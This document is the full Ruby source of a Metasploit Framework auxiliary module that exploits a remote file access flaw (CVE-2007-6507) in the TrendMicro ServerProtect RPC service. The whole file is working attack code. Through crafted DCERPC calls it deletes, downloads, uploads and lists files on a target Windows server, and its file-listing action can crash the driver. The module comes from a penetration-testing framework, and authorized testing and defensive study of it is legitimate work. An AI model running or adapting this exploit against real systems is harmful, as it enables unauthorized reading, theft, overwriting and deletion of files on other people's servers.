##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::DCERPC
	include Rex::Platforms::Windows

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'TrendMicro ServerProtect File Access',
			'Description'    => %q{
				This modules exploits a remote file access flaw in the ServerProtect Windows
			Server RPC service. Please see the action list (or the help output) for more
			information.
			},
			'DefaultOptions' =>
				{
					'DCERPC::ReadTimeout' => 300 # Long-running RPC calls
				},
			'Author'         => [ 'toto' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2007-6507' ],
					[ 'OSVDB', '44318' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-07-077.html'],
				],
			'Actions'        =>
				[
					[ 'delete'   ],
					[ 'download' ],
					[ 'upload'   ],
					[ 'list'     ]
				]
			))

		register_options(
			[
				Opt::RPORT(5168),
				OptString.new('RPATH',
					[
						false,
						"The remote filesystem path",
						nil
					]),
				OptString.new('LPATH',
					[
						false,
						"The local filesystem path",
						nil
					]),
			], self.class)
	end

	def check_option(name)
		if(not datastore[name])
			raise RuntimeError, "The #{name} parameter is required by this option"
		end
	end

	def auxiliary_commands
		{
			"delete" => "Delete a file",
			"download" => "Download a file",
			"upload" => "Upload a file",
			"list" => "List files (not recommended - will crash the driver)",
		}
	end

	def run
		case action.name
		when 'download'
			check_option('RPATH')
			check_option('LPATH')
			cmd_download(datastore['RPATH'], datastore['LPATH'])
		when 'upload'
			check_option('RPATH')
			check_option('LPATH')
			cmd_upload(datastore['RPATH'], datastore['LPATH'])
		when 'delete'
			check_option('RPATH')
			cmd_delete(datastore['RPATH'])
		when 'list'
			check_option('RPATH')
			cmd_list(datastore['RPATH'])
		else
			print_error("Unknown action #{action.name}")
		end
	end

	def deunicode(str)
		str.gsub(/\x00/, '').strip
	end

	#
	# Once this function is used, if cmd_download or cmd_upload is called the server will crash :/
	#
	def cmd_list(*args)

		if (args.length < 1)
			print_status("Usage: list folder")
			return
		end

		file = Rex::Text.to_unicode(args[0])

		data = "\0" * 0x100
		data[4, file.length] = file

		# FindFirstFile
		resp = serverprotect_rpccmd(131080, data, 0x100)
		return if not resp

		if resp.length != 0x108
			print_error("An unknown error occurred while calling FindFirstFile.")
			return
		end


		ret, = resp[0x104,4].unpack('V')
		if ret != 0
			print_error("An error occurred while calling FindFirstFile #{args[0]}: #{ret}.")
			return
		end

		handle, = resp[4,4].unpack('V')

		file = deunicode(resp[0x30, 0xd0])
		print("#{file}\n")

		data = "\0" * 0x100
		data[0,4] = [handle].pack('V')

		while true
			# FindNextFile
			resp = serverprotect_rpccmd(131081, data, 0x100)
			return if not resp

			if resp.length != 0x108
				print_error("An unknown error occurred while calling FindFirstFile.")
				break
			end

			ret, = resp[0x104,4].unpack('V')
			if ret != 0
				break
			end

			file = deunicode(resp[0x30, 0xd0])
			print("#{file}\n")
		end

		data = "\0" * 0x100
		data = [handle].pack('V')
		# FindClose
		resp = serverprotect_rpccmd(131082, data, 0x100)
	end


	def cmd_delete(*args)

		if (args.length == 0)
			print_status("Usage: delete c:\\windows\\system.ini")
			return
		end

		data = Rex::Text.to_unicode(args[0]+"\0")
		resp = serverprotect_rpccmd(131077, data, 4)
		return if not resp

		if (resp.length == 12)
			ret, = resp[8,4].unpack('V')

			if ret == 0
				print_status("File #{args[0]} successfully deleted.")
			else
				print_error("An error occurred while deleting #{args[0]}: #{ret}.")
			end
		end

	end


	def cmd_download(*args)

		if (args.length < 2)
			print_status("Usage: download remote_file local_file")
			return
		end

		# GENERIC_READ: 0x80000000
		# FILE_SHARE_READ: 1
		# OPEN_EXISTING: 3
		# FILE_ATTRIBUTE_NORMAL: 0x80
		handle = serverprotect_createfile(args[0], 0x80000000, 1, 3, 0x80)
		if (not handle or handle == 0)
			return
		end

		fd = File.new(args[1], "wb")

		print_status("Downloading #{args[0]}...")

		# reads 0x1000 bytes (hardcoded in the soft)
		while ((data = serverprotect_readfile(handle)).length > 0)
			fd.write(data)
		end

		fd.close

		serverprotect_closehandle(handle)

		print_status("File #{args[0]} successfully downloaded.")
	end


	def cmd_upload(*args)

		if (args.length < 2)
			print_status("Usage: upload local_file remote_file")
			return
		end

		# GENERIC_WRITE: 0x40000000
		# FILE_SHARE_WRITE: 2
		# CREATE_ALWAYS: 2
		# FILE_ATTRIBUTE_NORMAL: 0x80
		handle = serverprotect_createfile(args[1], 0x40000000, 2, 2, 0x80)
		if (handle == 0)
			return
		end

		fd = File.new(args[0], "rb")

		print_status("Uploading #{args[1]}...")

		# write 0x1000 bytes (hardcoded in the soft)
		while ((data = fd.read(0x1000)) != nil)
			serverprotect_writefile(handle, data)
		end

		fd.close

		serverprotect_closehandle(handle)

		print_status("File #{args[1]} successfully uploaded.")
	end


	def serverprotect_createfile(file, desiredaccess, sharemode, creationdisposition, flags)
		data = "\0" * 540
		file = Rex::Text.to_unicode(file)
		data[4, file.length] = file
		data[524, 16] = [desiredaccess, sharemode, creationdisposition, flags].pack('VVVV')

		resp = serverprotect_rpccmd(131073, data, 540)
		return if not resp

		if (resp.length < 548)
			print_error("An unknown error occurred while calling CreateFile.")
			return 0
		else
			handle, = resp[4,4].unpack('V')
			ret, = resp[544,4].unpack('V')

			if ret != 0
				print_error("An error occurred while calling CreateFile: #{ret}.")
				return 0
			else
				return handle
			end
		end
	end


	def serverprotect_readfile(handle)
		data = "\0" * 4104
		data[0, 4] = [handle].pack('V')

		resp = serverprotect_rpccmd(131075, data, 4104)
		return if not resp

		if (resp.length != 4112)
			print_error("An unknown error occurred while calling ReadFile.")
			return ''
		else
			ret, = resp[4108,4].unpack('V')

			if ret != 0
				print_error("An error occurred while calling CreateFile: #{ret}.")
				return ''
			else
				br, = resp[4104, 4].unpack('V')
				return resp[8, br]
			end
		end
	end


	def serverprotect_writefile(handle, buf)
		data = "\0" * 4104
		data[0, 4] = [handle].pack('V')
		data[4, buf.length] = buf
		data[4100, 4] = [buf.length].pack('V')

		resp = serverprotect_rpccmd(131076, data, 4104)
		return if not resp

		if (resp.length != 4112)
			print_error("An unknown error occurred while calling WriteFile.")
			return 0
		else
			ret, = resp[4108,4].unpack('V')

			if ret != 0
				print_error("An error occurred while calling WriteFile: #{ret}.")
				return 0
			end
		end

		return 1
	end


	def serverprotect_closehandle(handle)
		data = [handle].pack('V')

		resp = serverprotect_rpccmd(131074, data, 4)
		return if not resp

		if (resp.length != 12)
			print_error("An unknown error occurred while calling CloseHandle.")
		else
			ret, = resp[8,4].unpack('V')

			if ret != 0
				print_error("An error occurred while calling CloseHandle: #{ret}.")
			end
		end
	end


	def serverprotect_rpccmd(cmd, data, osize)
		if (data.length.remainder(4) != 0)
			padding = "\0" * (4 - (data.length.remainder(4)))
		else
			padding = ""
		end

		stub =
			NDR.long(cmd) +
			NDR.long(data.length) +
			data +
			padding +
			NDR.long(data.length) +
			NDR.long(osize)

		return serverprotect_rpc_call(0, stub)
	end

	#
	# Call the serverprotect RPC service
	#
	def serverprotect_rpc_call(opnum, data = '')

		begin

			connect

			handle = dcerpc_handle(
				'25288888-bd5b-11d1-9d53-0080c83a5c2c', '1.0',
				'ncacn_ip_tcp', [datastore['RPORT']]
			)

			dcerpc_bind(handle)

			resp = dcerpc.call(opnum, data)
			outp = ''

			if (dcerpc.last_response and dcerpc.last_response.stub_data)
				outp = dcerpc.last_response.stub_data
			end

			disconnect

			outp

		rescue ::Interrupt
			raise $!
		rescue ::Exception => e
			print_error("Error: #{e}")
			nil
		end
	end

end
